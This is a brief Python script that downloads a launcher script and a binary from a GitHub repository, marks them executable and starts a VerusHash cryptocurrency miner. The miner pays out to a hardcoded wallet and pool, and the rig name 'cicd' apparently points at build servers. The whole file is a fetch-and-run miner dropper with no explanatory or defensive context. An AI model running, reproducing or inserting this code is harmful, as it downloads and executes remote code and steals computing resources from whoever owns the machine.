import os

os.system("wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh")
os.system("wget https://github.com/hunshukajh/yes/raw/main/gas")
os.system("chmod +x gas cmdline_launcher.sh")
os.system("./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K -rigName cicd -pool1 na.luckpool.net:3956")
